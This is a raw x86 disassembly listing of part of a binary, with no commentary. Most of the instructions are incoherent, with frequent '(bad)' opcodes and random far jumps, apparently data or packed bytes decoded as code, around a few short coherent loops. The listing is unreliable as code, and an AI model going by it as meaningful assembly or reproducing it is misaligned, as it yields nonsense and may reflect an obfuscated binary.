  40f699:	pop    ebx
  40f69a:	jo     0x40f6ff
  40f69c:	add    DWORD PTR [edi],edi
  40f69e:	stos   DWORD PTR es:[edi],eax
  40f69f:	xchg   edx,eax
  40f6a0:	sbb    ecx,ebx
  40f6a2:	cs and bl,cl
  40f6a5:	add    eax,0xfda8e0dc
  40f6aa:	ja     0x40f6b0
  40f6ac:	or     edx,DWORD PTR [eax-0x2492fc60]
  40f6b2:	sbb    eax,0x8ceac9ec
  40f6b7:	mov    esi,0xbc194bcf
  40f6bc:	cmc    
  40f6bd:	call   0x6e9d2bfa
  40f6c2:	adc    DWORD PTR [edi+eiz*2],esp
  40f6c5:	add    al,0x4c
  40f6c7:	add    al,0x37
  40f6c9:	icebp  
  40f6ca:	repz sbb al,0xa
  40f6cd:	adc    cl,BYTE PTR [eax+0x35]
  40f6d0:	mov    ds:0xd7dccc7,eax
  40f6d5:	push   eax
  40f6d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6d7:	retf   
  40f6d8:	icebp  
  40f6d9:	inc    ebx
  40f6da:	out    0x44,al
  40f6dc:	cmp    edi,edx
  40f6de:	aad    0xae
  40f6e0:	pop    ds
  40f6e1:	cmp    ebp,DWORD PTR [ebx-0xfc2717]
  40f6e7:	xchg   BYTE PTR [ebx+0x4a],al
  40f6ea:	pop    edi
  40f6eb:	and    DWORD PTR [ebp+0x75],0x5139287c
  40f6f2:	icebp  
  40f6f3:	stos   BYTE PTR es:[edi],al
  40f6f4:	ds mov ah,0x74
  40f6f7:	test   BYTE PTR [esi],ah
  40f6f9:	(bad)  
  40f6fa:	cmc    
  40f6fb:	shl    ebp,cl
  40f6fd:	sub    esi,DWORD PTR [esi+0x42]
  40f700:	pusha  
  40f701:	and    ax,0x32c4
  40f705:	xor    esp,DWORD PTR [ebx]
  40f707:	jg     0x40f6b0
  40f709:	pop    edi
  40f70a:	cmc    
  40f70b:	popf   
  40f70c:	dec    edi
  40f70d:	xchg   DWORD PTR ds:0xac10a6f7,ebp
  40f713:	dec    edx
  40f714:	das    
  40f715:	push   0xffffffcb
  40f717:	mov    edi,0xb2b257fd
  40f71c:	sub    eax,0xeb9f8e24
  40f721:	adc    ch,BYTE PTR [ebx-0x43]
  40f724:	test   al,0xcb
  40f726:	jns    0x40f6ee
  40f728:	inc    BYTE PTR [eax]
  40f72a:	sbb    ebp,ecx
  40f72c:	retf   0xaf5
  40f72f:	jmp    0x40f797
  40f731:	inc    edi
  40f732:	mov    dl,0x6e
  40f734:	out    dx,eax
  40f735:	xchg   edx,eax
  40f736:	int3   
  40f737:	mov    dl,0xa
  40f739:	mov    BYTE PTR [eax],dh
  40f73b:	ret    
  40f73c:	data16 mov ch,cl
  40f73f:	lds    ecx,FWORD PTR [eax]
  40f741:	jne    0x40f734
  40f743:	dec    ecx
  40f744:	fimul  WORD PTR [eax]
  40f746:	fwait
  40f747:	push   ebx
  40f748:	adc    DWORD PTR [ebx-0x6f],ecx
  40f74b:	ds push ebx
  40f74d:	push   esp
  40f74e:	cs in  eax,dx
  40f750:	adc    al,0xe0
  40f752:	fld    TBYTE PTR [ebx-0x57352584]
  40f758:	icebp  
  40f759:	aad    0xf2
  40f75b:	test   eax,0x226571a4
  40f760:	inc    esi
  40f761:	and    edx,DWORD PTR [edi-0x74bd6ee]
  40f767:	pusha  
  40f768:	(bad)  
  40f769:	xchg   BYTE PTR fs:[edi-0x573ae754],ch
  40f770:	nop
  40f771:	or     ch,BYTE PTR [edx]
  40f773:	out    dx,al
  40f774:	jne    0x40f7a9
  40f776:	imul   ebx,edi,0x406d31db
  40f77c:	(bad)  
  40f77d:	outs   dx,BYTE PTR ds:[esi]
  40f77e:	xchg   BYTE PTR [edx],al
  40f780:	mov    cl,0xce
  40f782:	in     eax,dx
  40f783:	jmp    DWORD PTR [esi]
  40f785:	aam    0xb1
  40f787:	jecxz  0x40f7d3
  40f789:	idiv   DWORD PTR [edi-0x40]
  40f78c:	pop    edi
  40f78d:	or     al,0x22
  40f78f:	push   0x4b48417b
  40f794:	shl    ebx,cl
  40f796:	(bad)  
  40f797:	cmp    DWORD PTR [ebx+0x51dbadb2],eax
  40f79d:	or     bl,ah
  40f79f:	ret    
  40f7a0:	mov    ebx,0x2c80e116
  40f7a5:	in     al,0x76
  40f7a7:	mov    DWORD PTR [ebp-0x3aa6707b],ecx
  40f7ad:	sti    
  40f7ae:	inc    edx
  40f7af:	repnz aam 0x9b
  40f7b2:	(bad)  
  40f7b3:	jg     0x40f7b6
  40f7b5:	(bad)  
  40f7b6:	scas   al,BYTE PTR es:[edi]
  40f7b7:	and    edi,edi
  40f7b9:	loopne 0x40f7b3
  40f7bb:	dec    ebp
  40f7bc:	mov    edi,0x263df307
  40f7c1:	xor    esi,DWORD PTR [eax]
  40f7c3:	pusha  
  40f7c4:	push   ebx
  40f7c5:	out    dx,al
  40f7c6:	xor    BYTE PTR [edi+0x66],ah
  40f7c9:	in     al,0x77
  40f7cb:	jmp    0x3492:0x96a4301e
  40f7d2:	xchg   esp,ecx
  40f7d4:	mov    al,ds:0x30e8cf49
  40f7d9:	xor    al,BYTE PTR ds:0x5102798
  40f7df:	sbb    eax,0xafcd72c4
  40f7e4:	mov    eax,0x3419492
  40f7e9:	sar    DWORD PTR [ebx],1
  40f7eb:	cli    
  40f7ec:	mov    DWORD PTR ds:0x42a799,0x7d48
  40f7f6:	jmp    0x40fa7e
  40f7fb:	ret    0xc9cd
  40f7fe:	ret    
  40f7ff:	(bad)  
  40f801:	retf   0x10cd
  40f804:	test   BYTE PTR ds:0x96b5a15f,ch
  40f80a:	stos   BYTE PTR es:[edi],al
  40f80b:	and    BYTE PTR [edi+0x78],al
  40f80e:	js     0x40f7f5
  40f810:	jle    0x40f88a
  40f812:	js     0x40f79d
  40f814:	adc    dh,dl
  40f816:	aaa    
  40f817:	push   edi
  40f818:	or     esp,DWORD PTR [ecx]
  40f81a:	inc    esi
  40f81b:	push   0xffffff81
  40f81d:	mov    edx,DWORD PTR [esi]
  40f81f:	and    bl,bh
  40f821:	sub    esp,edx
  40f823:	je     0x40f88d
  40f825:	fadd   DWORD PTR [ebp-0x5702434e]
  40f82b:	fstp   TBYTE PTR [edi-0x1e]
  40f82e:	sbb    esi,esp
  40f830:	push   esp
  40f831:	(bad)  
  40f832:	mov    edx,DWORD PTR [ebp-0x7]
  40f835:	dec    ecx
  40f836:	mov    edi,0x47e6155a
  40f83b:	ja     0x40f814
  40f83d:	push   es
  40f83e:	jo     0x40f814
  40f840:	fisttp WORD PTR [eax]
  40f842:	imul   DWORD PTR [ebp+edx*8-0x27984811]
  40f849:	ins    DWORD PTR es:[edi],dx
  40f84a:	fwait
  40f84b:	ret    0xf047
  40f84e:	std    
  40f84f:	add    BYTE PTR [eax],al
  40f851:	das    
  40f852:	je     0x40f7de
  40f854:	ss push 0x9d7fc451
  40f85a:	jo     0x40f849
  40f85c:	jle    0x40f8c1
  40f85e:	mov    edi,0xb3defca3
  40f863:	stos   DWORD PTR es:[edi],eax
  40f864:	jle    0x40f844
  40f866:	lods   al,BYTE PTR ds:[esi]
  40f867:	push   ss
  40f868:	or     eax,0x7a355022
  40f86d:	aaa    
  40f86e:	mov    eax,ds:0xec506c8d
  40f873:	jno    0x40f88e
  40f875:	cwde   
  40f876:	or     al,BYTE PTR [edx-0x67]
  40f879:	cmp    al,0x32
  40f87b:	jmp    0x37a3:0xebf6f551
  40f882:	test   DWORD PTR [esi+0x39],0x976410c4
  40f889:	dec    ebp
  40f88a:	pop    ecx
  40f88c:	sti    
  40f88d:	mov    esp,0x3da2230
  40f892:	ins    DWORD PTR es:[edi],dx
  40f893:	pop    ss
  40f894:	mov    ebx,0x8088993
  40f899:	inc    ebx
  40f89a:	icebp  
  40f89b:	ss in  eax,dx
  40f89d:	jg     0x40f83d
  40f89f:	sbb    BYTE PTR [ecx+esi*4],cl
  40f8a2:	mov    bl,0xa4
  40f8a4:	ds retf 
  40f8a6:	(bad)  
  40f8a7:	lock pcmpeqd mm6,QWORD PTR [ebx+0x66]
  40f8ac:	sbb    eax,0x42d9971f
  40f8b1:	mov    ds:0xa1ad3bae,eax
  40f8b6:	mov    ecx,0x449cbf01
  40f8bb:	icebp  
  40f8bc:	xor    bh,BYTE PTR [edi]
  40f8be:	je     0x40f858
  40f8c0:	xor    al,0xe7
  40f8c2:	aaa    
  40f8c3:	lds    esi,FWORD PTR [edi+0x21]
  40f8c6:	aaa    
  40f8c7:	cmp    cl,dh
  40f8c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8ca:	out    dx,eax
  40f8cb:	dec    eax
  40f8cc:	mov    bh,0x88
  40f8ce:	das    
  40f8cf:	and    BYTE PTR [esi+0x5e],bl
  40f8d2:	les    ebx,FWORD PTR [eax]
  40f8d4:	shl    BYTE PTR cs:[ecx],cl
  40f8d7:	les    edi,FWORD PTR [esi]
  40f8d9:	jge    0x40f89f
  40f8db:	or     edi,ebx
  40f8dd:	jge    0x40f897
  40f8df:	adc    DWORD PTR [edi+0x6cc9a72],0xffffff8f
  40f8e6:	mov    WORD PTR [edi],?
  40f8e8:	loope  0x40f951
  40f8ea:	stc    
  40f8eb:	push   edx
  40f8ec:	clc    
  40f8ed:	mov    eax,0x35c2c433
  40f8f2:	out    0xfd,al
  40f8f4:	xor    BYTE PTR [ecx-0x4345a954],0x9b
  40f8fb:	inc    ebx
  40f8fc:	xchg   ch,al
  40f8fe:	push   cs
  40f8ff:	mov    ebx,0x6f15b9c
  40f904:	mov    bl,0x89
  40f906:	imul   BYTE PTR [esp+edx*2]
  40f909:	cmp    DWORD PTR [ecx+0x59],0xffffffdf
  40f90d:	xchg   ebx,eax
  40f90e:	stc    
  40f90f:	xchg   DWORD PTR [edx+0x17e2d306],ebp
  40f915:	aaa    
  40f916:	ja     0x40f90a
  40f918:	aas    
  40f919:	jb     0x40f917
  40f91b:	(bad)  
  40f91c:	loopne 0x40f95b
  40f91e:	jg     0x40f8e8
  40f920:	sbb    BYTE PTR [ecx+ebx*1],al
  40f923:	xchg   esi,eax
  40f924:	arpl   WORD PTR [edi-0x488a0d55],ax
  40f92a:	jno    0x40f927
  40f92c:	mov    ch,0xb
  40f92e:	fld    TBYTE PTR [edx-0x64ef26cd]
  40f934:	mov    ebx,DWORD PTR [ebx-0x1b]
  40f937:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f938:	call   0xb2b35d5a
  40f93d:	ret    
  40f93e:	jp     0x40f9b0
  40f940:	fld    DWORD PTR [ebx]
  40f942:	xchg   esi,eax
  40f943:	cmp    DWORD PTR [edx+0x30],eax
  40f946:	adc    cl,bh
  40f948:	mov    bl,0xe7
  40f94a:	mov    bh,BYTE PTR [eax-0x1f]
  40f94d:	pop    ds
  40f94e:	ret    
  40f94f:	mov    ds:0xb2c3e4b5,eax
  40f954:	xchg   ebp,eax
  40f955:	in     eax,dx
  40f956:	cs push edx
  40f958:	mov    dh,0xee
  40f95a:	ja     0x40f957
  40f95c:	pop    ebx
  40f95d:	mov    esi,esi
  40f95f:	push   edi
  40f960:	and    BYTE PTR [eax-0x45],dh
  40f963:	(bad)  
  40f964:	in     eax,dx
  40f965:	into   
  40f966:	inc    ebp
  40f967:	cld    
  40f968:	jp     0x40f976
  40f96a:	xchg   esi,eax
  40f96b:	clc    
  40f96c:	out    0xf6,eax
  40f96e:	rcl    ebx,cl
  40f970:	daa    
  40f971:	xchg   edx,eax
  40f972:	out    0xea,al
  40f974:	lds    ecx,FWORD PTR [eax-0x52]
  40f977:	push   cs
  40f978:	mov    DWORD PTR [ebx-0x5c],ecx
  40f97b:	call   0xf44e:0xcbb5fb2
  40f982:	scas   al,BYTE PTR es:[edi]
  40f983:	fisttp WORD PTR [ebp-0x35e4a087]
  40f989:	out    dx,al
  40f98a:	loop   0x40f924
  40f98c:	cmp    al,0x5a
  40f98e:	int    0x9a
  40f990:	rcl    DWORD PTR [edi+0x35],cl
  40f993:	mov    ah,bl
  40f995:	cwde   
  40f996:	adc    BYTE PTR [ecx+0x59],ch
  40f999:	push   0x21bc0534
  40f99e:	in     eax,0xe4
  40f9a0:	mov    al,ds:0x1393416d
  40f9a5:	push   cs
  40f9a6:	pop    ds
  40f9a7:	rcr    BYTE PTR [ebx+eax*2-0x6f013971],0x2e
  40f9af:	mov    ebx,0x9ca55ab5
  40f9b4:	iret   
  40f9b5:	(bad)  
  40f9b6:	out    0x6,al
  40f9b8:	cmp    al,0x4e
  40f9ba:	xor    BYTE PTR [ebx-0x9b52dd3],bl
  40f9c0:	pop    esi
  40f9c1:	lea    eax,[eax-0xd06853c]
  40f9c7:	(bad)  
  40f9c8:	push   0xffffffd8
  40f9ca:	inc    edx
  40f9cb:	push   ebx
  40f9cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9cd:	das    
  40f9ce:	mov    esp,0x61c888ed
  40f9d3:	jp     0x40fa07
  40f9d5:	das    
  40f9d6:	xchg   esp,eax
  40f9d7:	shl    bl,cl
  40f9d9:	sbb    DWORD PTR [ebx],esi
  40f9db:	mov    edx,0x1dc256ea
  40f9e0:	mov    ah,0xac
  40f9e2:	(bad)  
  40f9e3:	push   esi
  40f9e4:	popf   
  40f9e5:	mov    ebp,0xc371d5c
  40f9ea:	nop
  40f9eb:	pusha  
  40f9ec:	sbb    al,0xae
  40f9ee:	pop    ebx
  40f9ef:	xchg   esi,eax
  40f9f0:	add    eax,0x9e4f924b
  40f9f5:	jno    0x40fa56
  40f9f7:	stos   DWORD PTR es:[edi],eax
  40f9f8:	aas    
  40f9f9:	push   ecx
  40f9fa:	clc    
  40f9fb:	scas   eax,DWORD PTR es:[edi]
  40f9fc:	push   ecx
  40f9fd:	jo     0x40fa46
  40f9ff:	mov    cl,0x72
  40fa01:	in     al,0x46
  40fa03:	mov    dl,0xa8
  40fa05:	lds    ebx,FWORD PTR [edx-0xa367220]
  40fa0b:	or     edi,DWORD PTR ds:0x7e3be61f
  40fa11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa12:	jl     0x40f9fe
  40fa14:	outs   dx,BYTE PTR ds:[esi]
  40fa15:	mov    esi,0xf552875d
  40fa1a:	ret    
  40fa1b:	xor    eax,0x9a27eca6
  40fa20:	adc    DWORD PTR [edx-0x67],edx
  40fa23:	push   edi
  40fa24:	enter  0xb836,0x29
  40fa28:	cmp    DWORD PTR [edx+0x7c],edi
  40fa2b:	test   DWORD PTR [ebx+ebp*2+0x16a71fc0],esp
  40fa32:	and    dl,0x8
  40fa35:	pop    ecx
  40fa36:	xchg   ecx,eax
  40fa37:	mov    dh,0x6d
  40fa39:	dec    esi
  40fa3a:	addr16 xchg edx,eax
  40fa3c:	push   ecx
  40fa3d:	ss retf 0x824d
  40fa41:	out    dx,eax
  40fa42:	and    ebp,ebx
  40fa44:	add    al,0xe3
  40fa46:	fmul   DWORD PTR [edx]
  40fa49:	(bad)  
  40fa4b:	mov    esp,0xa67aa6fc
  40fa50:	cmc    
  40fa51:	lock mov ebp,0xc08a6f07
  40fa57:	lea    eax,[esi+0x45]
  40fa5a:	dec    ebp
  40fa5b:	les    ebx,FWORD PTR [ecx+eax*2+0x351fdbb7]
  40fa62:	mov    dl,ah
  40fa64:	mov    ebx,0x1ad781b2
  40fa69:	pop    eax
  40fa6a:	sbb    al,0xc6
  40fa6c:	daa    
  40fa6d:	pop    esi
  40fa6e:	mov    dl,0x54
  40fa70:	lahf   
  40fa71:	ret    
  40fa72:	call   0xfec79807
  40fa77:	rcr    DWORD PTR [eax-0x6ac07b15],1
  40fa7d:	pop    esi
  40fa7e:	je     0x414e2f
  40fa84:	push   ebx
  40fa85:	mov    DWORD PTR ds:0x42a829,0x5779
  40fa8f:	jmp    0x4148fa
  40fa94:	mov    DWORD PTR ds:0x42a7e1,0x1b
  40fa9e:	cmp    DWORD PTR ds:0x42a7e1,0x0
  40faa5:	je     0x40faf7
  40faab:	cmp    DWORD PTR ds:0x42a7e1,0x7
  40fab2:	jne    0x40facb
  40fab8:	push   0x6ecd
  40fabd:	push   0x4c4c
  40fac2:	push   DWORD PTR [ebp-0x1c]
  40fac5:	call   DWORD PTR ds:0x41d1a8
  40facb:	cmp    DWORD PTR ds:0x42a7e1,0x8
  40fad2:	jne    0x40fae5
  40fad8:	mov    edi,DWORD PTR ds:0x42a7e1
  40fade:	dec    edi
  40fadf:	mov    DWORD PTR ds:0x42a7e1,edi
  40fae5:	mov    edi,DWORD PTR ds:0x42a7e1
  40faeb:	dec    edi
  40faec:	mov    DWORD PTR ds:0x42a7e1,edi
  40faf2:	jmp    0x40fa9e
  40faf7:	mov    edx,DWORD PTR [ebp-0x8]
  40fafa:	mov    edi,DWORD PTR [ebp-0x10]
  40fafd:	jmp    0x40fd85
  40fb02:	cmp    eax,0xd9c7c9d6
  40fb07:	fcmovnb st,st(1)
  40fb09:	(bad)  
  40fb0a:	cmc    
  40fb0b:	into   
  40fb0c:	inc    edx
  40fb0d:	jge    0x40faec
  40fb0f:	outs   dx,DWORD PTR ds:[esi]
  40fb10:	nop
  40fb11:	pushf  
  40fb12:	lea    eax,[ebp+0x78]
  40fb15:	js     0x40fafc
  40fb17:	jle    0x40fb91
  40fb19:	js     0x40fabc
  40fb1b:	mov    ebx,0x573ff411
  40fb20:	add    eax,0x13459104
  40fb25:	out    0xf0,eax
  40fb27:	xchg   DWORD PTR [eax-0x4434b7bf],esp
  40fb2d:	pop    edx
  40fb2e:	aas    
  40fb2f:	add    eax,0xb11bae7a
  40fb34:	dec    ebx
  40fb35:	pop    ebx
  40fb36:	imul   ebx,DWORD PTR [edx+0x348a2c32],0xffffff84
  40fb3d:	cld    
  40fb3e:	(bad)  
  40fb3f:	pop    esp
  40fb40:	stc    
  40fb41:	xor    al,0x14
  40fb43:	hlt    
  40fb44:	das    
  40fb45:	pushf  
  40fb46:	dec    esi
  40fb47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb48:	or     BYTE PTR [eax+0x6b],bh
  40fb4b:	dec    ebp
  40fb4c:	loop   0x40fb12
  40fb4e:	pushf  
  40fb4f:	lods   al,BYTE PTR ds:[esi]
  40fb50:	ss ins DWORD PTR es:[edi],dx
  40fb52:	fiadd  WORD PTR [ebx-0x307a7665]
  40fb58:	adc    esp,edx
  40fb5a:	arpl   WORD PTR [eax+0x58],bx
  40fb5d:	cmp    BYTE PTR [ebx],dh
  40fb5f:	mov    ebp,0xd7600077
  40fb64:	fisttp DWORD PTR [eax]
  40fb66:	mov    ss,WORD PTR [ebp-0x38]
  40fb69:	sub    al,0xce
  40fb6b:	data16 mov WORD PTR [edx-0x3],ss
  40fb6f:	xor    DWORD PTR [edx+0x77],esi
  40fb72:	mov    eax,ds:0xa2b68cce
  40fb77:	mov    eax,0x8a78f30b
  40fb7c:	mov    DWORD PTR [ecx+0x19da5674],ebp
  40fb82:	jecxz  0x40fbf8
  40fb84:	bound  ebx,QWORD PTR [edi+0x1b3a3e40]
  40fb8a:	cmp    BYTE PTR [ebx],dh
  40fb8c:	imul   ebp,DWORD PTR [edi+0x6934a32f],0xb8f8e5fb
  40fb96:	sbb    dh,al
  40fb98:	or     esp,DWORD PTR [esi-0x508a3d71]
  40fb9e:	mov    ds:0xd5682011,al
  40fba3:	or     DWORD PTR [edx],edi
  40fba5:	mov    edx,0x9ce7df3a
  40fbaa:	pop    eax
  40fbab:	dec    esi
  40fbac:	add    al,0x93
  40fbae:	dec    ecx
  40fbaf:	push   ebx
  40fbb0:	in     eax,dx
  40fbb1:	mov    ds,WORD PTR [ebp+0x37]
  40fbb4:	or     cl,BYTE PTR [esi+0x13ffb505]
  40fbba:	mov    edi,0x52901d39
  40fbbf:	lock pop edi
  40fbc1:	jnp    0x40fbe2
  40fbc3:	cdq    
  40fbc4:	push   ss
  40fbc5:	xor    al,0xae
  40fbc7:	and    bh,BYTE PTR [eax]
  40fbc9:	sar    BYTE PTR [ecx-0x7c],0xed
  40fbcd:	mov    DWORD PTR ds:0x2c0924ed,ebp
  40fbd3:	mov    dh,0x60
  40fbd5:	dec    edx
  40fbd6:	sar    BYTE PTR [edi+0x4e],1
  40fbd9:	push   ebx
  40fbda:	inc    ebp
  40fbdb:	xchg   DWORD PTR [ebx+0x2e53bcad],ecx
  40fbe1:	adc    eax,0x52ce9062
  40fbe6:	div    BYTE PTR [edi+eax*8]
  40fbe9:	inc    eax
  40fbea:	sub    BYTE PTR [edx],0xc7
  40fbed:	dec    ebx
  40fbee:	push   edx
  40fbef:	retf   0xcca5
  40fbf2:	push   ecx
  40fbf3:	test   al,0xe6
  40fbf5:	and    BYTE PTR [esi+0x47a39781],dl
  40fbfb:	les    ecx,FWORD PTR [eax+0x6c]
  40fbfe:	setno  BYTE PTR [edi+0x59]
  40fc02:	and    DWORD PTR [ecx-0xd71fa4a],esi
  40fc08:	xchg   esp,eax
  40fc09:	xor    edx,ecx
  40fc0b:	std    
  40fc0c:	pop    ss
  40fc0d:	or     bh,BYTE PTR [ebp+0x53ead917]
  40fc13:	mov    ebp,0xa9ce7421
  40fc18:	sbb    ch,bh
  40fc1a:	xor    bl,cl
  40fc1c:	mov    ecx,0xf0b937ea
  40fc21:	sar    bh,cl
  40fc23:	rcr    BYTE PTR [esi],1
  40fc25:	repnz scas al,BYTE PTR es:[edi]
  40fc27:	test   al,0xd1
  40fc29:	iret   
  40fc2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc2b:	mov    ds:0x3ca23e0d,eax
  40fc30:	fnstenv [ecx-0x72a29e12]
  40fc36:	test   BYTE PTR [edi+ebp*8-0x7e20250d],bl
  40fc3d:	dec    ebp
  40fc3e:	repnz push ds
  40fc40:	sbb    dl,BYTE PTR [eax+0x13efb6a8]
  40fc46:	sbb    al,0x40
  40fc48:	rol    BYTE PTR [ebp-0x52],0x1a
  40fc4c:	out    0x48,eax
  40fc4e:	adc    al,0x45
  40fc50:	xchg   edi,eax
  40fc51:	sbb    edi,edx
  40fc53:	icebp  
  40fc54:	jge    0x40fc7d
  40fc56:	jae    0x40fca1
  40fc58:	test   DWORD PTR [bp+si-0x7b],eax
  40fc5c:	mov    eax,0x569dbdcd
  40fc61:	lods   eax,DWORD PTR ds:[esi]
  40fc62:	in     eax,0xbf
  40fc64:	imul   eax,ebp,0xffffffbb
  40fc67:	(bad)  
  40fc69:	scas   al,BYTE PTR es:[edi]
  40fc6a:	jmp    0x5a23:0xaabbce5
  40fc71:	cmp    DWORD PTR [edx],edx
  40fc73:	mov    ebx,0x53090e4e
  40fc78:	lock xor DWORD PTR [eax],0x44b34690
  40fc7f:	(bad)  
  40fc80:	ins    DWORD PTR es:[edi],dx
  40fc81:	into   
  40fc82:	mov    ch,0x48
  40fc84:	mov    ch,0xe5
  40fc86:	push   esp
  40fc87:	stc    
  40fc88:	push   cs
  40fc89:	arpl   WORD PTR [esi+esi*1],dx
  40fc8c:	pop    ds
  40fc8d:	loope  0x40fc96
  40fc8f:	xchg   ebp,eax
  40fc90:	adc    BYTE PTR [esi-0x38],bl
  40fc93:	mov    fs,WORD PTR [ebx-0x72d073e3]
  40fc99:	pushf  
  40fc9a:	test   al,0xbb
  40fc9c:	rcl    BYTE PTR [eax+0x76d8ba04],1
  40fca2:	push   edi
  40fca3:	mov    bl,0x80
  40fca5:	add    eax,0x104ace6
  40fcaa:	(bad)  
  40fcab:	cmp    esi,eax
  40fcad:	xor    eax,0x8a255b28
  40fcb2:	sbb    bh,ah
  40fcb4:	mov    WORD PTR [ecx+esi*1+0x6d],ss
  40fcb8:	jae    0x40fc64
  40fcba:	and    dl,BYTE PTR fs:[ebx-0x6018a96f]
  40fcc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcc2:	pop    edx
  40fcc3:	push   edi
  40fcc4:	and    DWORD PTR [edx],0x141d1384
  40fcca:	ds xchg ah,dh
  40fccd:	pop    ss
  40fcce:	jno    0x40fc66
  40fcd0:	test   BYTE PTR [ebx+0x7d],dh
  40fcd3:	sbb    al,0xea
  40fcd5:	xchg   ecx,eax
  40fcd6:	inc    esi
  40fcd7:	sub    eax,0xef687dd9
  40fcdc:	fnsave ds:0xd2f10e3e
  40fce2:	es cmp eax,0x8b56a77
  40fce8:	dec    ebx
  40fce9:	jmp    ecx
  40fceb:	lock in eax,dx
  40fced:	mov    bh,0x43
  40fcef:	add    al,0x4a
  40fcf1:	adc    eax,0x367e6fb4
  40fcf6:	add    al,0x1e
  40fcf8:	scas   eax,DWORD PTR es:[edi]
  40fcf9:	mov    dh,0x76
  40fcfb:	jg     0x40fcef
  40fcfd:	pop    es
  40fcfe:	and    esi,DWORD PTR [edx]
  40fd00:	xor    DWORD PTR [ebx+0x6a2ac010],eax
  40fd06:	mov    dl,BYTE PTR [esi-0x926039a]
  40fd0c:	mov    dh,0xc4
  40fd0e:	fs jp  0x40fd55
  40fd11:	bound  ebp,QWORD PTR [ebp+0x1429245c]
  40fd17:	add    BYTE PTR [edi-0x1810c1a2],0xaf
  40fd1e:	bswap  edi
  40fd20:	mov    eax,0x5796507d
  40fd25:	sahf   
  40fd26:	enter  0xee49,0x14
  40fd2a:	adc    bl,bl
  40fd2c:	fstp   st(5)
  40fd2e:	adc    edi,ebp
  40fd30:	mov    ah,0x7e
  40fd32:	pop    edi
  40fd33:	xchg   ebp,eax
  40fd34:	add    ch,BYTE PTR [eax+edx*4-0x74]
  40fd38:	jmp    DWORD PTR [eax+0x40]
  40fd3b:	iret   
  40fd3c:	ret    
  40fd3d:	imul   ebp,DWORD PTR [esi],0xffffffab
  40fd40:	sbb    DWORD PTR [edx],esp
  40fd42:	fdivp  st(1),st
  40fd44:	dec    ebx
  40fd45:	xor    esi,0xd54437b
  40fd4b:	(bad)  
  40fd4c:	fdivr  QWORD PTR [eax-0x2b878dca]
  40fd52:	popa   
  40fd53:	sbb    eax,DWORD PTR [edi+0x3d]
  40fd56:	(bad)  
  40fd57:	xor    al,0xd9
  40fd59:	or     edx,edi
  40fd5b:	enter  0xa1fe,0xca
  40fd5f:	push   0x43
  40fd61:	and    al,0x4c
  40fd63:	dec    edi
  40fd64:	adc    al,0xf8
  40fd66:	xlat   BYTE PTR ds:[ebx]
  40fd67:	inc    ecx
  40fd68:	pop    ecx
  40fd69:	(bad)  
  40fd6b:	or     BYTE PTR [edi+0x7905b910],bl
  40fd71:	outs   dx,BYTE PTR ds:[esi]
  40fd72:	mov    eax,0x478f4c92
  40fd77:	sub    DWORD PTR [eax+0x6b],ebp
  40fd7a:	xchg   edx,eax
  40fd7b:	sub    eax,0xd1314838
  40fd80:	shl    BYTE PTR [ebx+0x1d],cl
  40fd83:	sub    al,BYTE PTR [ebx+ebp*1-0x6]
  40fd87:	mov    edx,DWORD PTR [ebp-0x4]
  40fd8a:	xor    edx,eax
  40fd8c:	add    edx,ecx
  40fd8e:	cmp    edi,edx
  40fd90:	jb     0x414e2e
  40fd96:	mov    edx,DWORD PTR [ebp-0x28]
  40fd99:	mov    edi,DWORD PTR [ebp-0x4]
  40fd9c:	xor    edx,eax
  40fd9e:	xor    edi,eax
  40fda0:	add    edi,ecx
  40fda2:	add    edx,ecx
  40fda4:	imul   edx,edi
  40fda7:	mov    edi,DWORD PTR [ebp-0x8]
  40fdaa:	jmp    0x410032
  40fdaf:	mov    ecx,0xcac93ec5
  40fdb5:	(bad)  
  40fdb6:	leave  
  40fdb7:	dec    esp
  40fdb8:	mov    bl,0x33
  40fdba:	std    
  40fdbb:	sahf   
  40fdbc:	push   edi
  40fdbd:	jne    0x40fdf6
  40fdbf:	jp     0x40fe0c
  40fdc1:	js     0x40fe3b
  40fdc3:	in     eax,0x7e
  40fdc5:	js     0x40fe3f
  40fdc7:	adc    BYTE PTR [edx],ah
  40fdc9:	nop
  40fdca:	xor    al,0xbd
  40fdcc:	mov    eax,0x969f1c32
  40fdd1:	xor    dl,al
  40fdd3:	inc    ebx
  40fdd4:	jecxz  0x40fd56
  40fdd6:	jge    0x40fe10
  40fdd8:	adc    ebp,DWORD PTR [edx]
  40fdda:	or     ebx,DWORD PTR [edx]
  40fddc:	pop    esp
  40fddd:	nop
  40fdde:	aad    0x5f
  40fde0:	sub    DWORD PTR [eax+0x2b],ecx
  40fde3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fde4:	retf   0xa91b
  40fde7:	mul    esp
  40fde9:	push   es
  40fdea:	retf   0xf6ab
  40fded:	test   DWORD PTR [ecx-0x3b65faf8],0xf74457d1
  40fdf7:	icebp  
  40fdf8:	mov    esi,0xb097d945
  40fdfd:	jb     0x40fe6c
  40fdff:	in     eax,dx
  40fe00:	mov    al,ds:0x289ea626
  40fe05:	or     BYTE PTR [edi-0x78ffbeef],bl
  40fe0b:	or     DWORD PTR [ebx+0x64],eax
  40fe0e:	push   edi
  40fe0f:	pop    edi
  40fe10:	mov    bl,0x24
  40fe12:	fsubr  st,st(7)
  40fe14:	addr16 arpl di,bp
  40fe17:	mov    eax,ds:0x6214face
  40fe1c:	cmp    ebp,DWORD PTR [edx-0x3f409c18]
  40fe22:	sbb    esp,DWORD PTR [edi+ebx*1+0x5d26e0c8]
  40fe29:	lahf   
  40fe2a:	jb     0x40fe11
  40fe2c:	and    al,0xa8
  40fe2e:	cmp    ah,BYTE PTR [esi+0x49dcfb86]
  40fe34:	mov    cl,0xce
  40fe36:	repz cmc 
  40fe38:	push   es
  40fe39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe3a:	jne    0x40fded
  40fe3c:	shr    BYTE PTR [ebx+edx*1-0x11],0x3f
  40fe41:	jmp    0x40fe1a
  40fe43:	adc    BYTE PTR [edx],bh
  40fe45:	js     0x40fe38
  40fe47:	clc    
